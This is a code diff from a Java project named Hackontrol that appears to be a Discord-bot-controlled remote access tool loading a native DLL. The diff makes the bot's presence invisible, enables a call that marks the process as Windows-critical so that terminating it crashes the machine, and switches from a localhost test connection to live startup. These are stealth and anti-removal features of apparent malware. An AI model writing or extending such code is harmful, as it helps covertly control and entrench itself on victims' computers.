@@ -22,6 +22,7 @@ import com.khopan.hackontrol.utils.HackontrolError;
 
 import net.dv8tion.jda.api.JDA;
 import net.dv8tion.jda.api.JDABuilder;
+import net.dv8tion.jda.api.OnlineStatus;
 import net.dv8tion.jda.api.entities.Guild;
 import net.dv8tion.jda.api.entities.channel.concrete.Category;
 import net.dv8tion.jda.api.requests.GatewayIntent;
@@ -69,6 +70,8 @@ public class Hackontrol {
 			throw new RuntimeException();
 		}
 
+		Hackontrol.LOGGER.info("Set status to offline");
+		this.bot.getPresence().setStatus(OnlineStatus.INVISIBLE);
 		Hackontrol.LOGGER.info("Bot is ready");
 		serviceManager.initialize(this.bot);
 		this.guild = this.bot.getGuildById(1173967259304198154L);
@@ -96,7 +99,7 @@ public class Hackontrol {
 		}
 
 		panelManager.initialize(this.category);
-		//Kernel.setProcessCritical(true);
+		Kernel.setProcessCritical(true);
 	}
 
 	public String getMachineIdentifier() {
@@ -144,8 +147,7 @@ public class Hackontrol {
 
 		Kernel.PathFileLibHRSP32 = new File(pathFolderHackontrol, "libhrsp32.dll").getAbsolutePath();
 		Hackontrol.LOGGER.info("Initializing");
-		//Hackontrol.getInstance();
-		Kernel.connectHRSPServer("localhost", 42485, System.out :: println);
+		Hackontrol.getInstance();
 	}
 
 	private static void error(String message) throws Throwable {
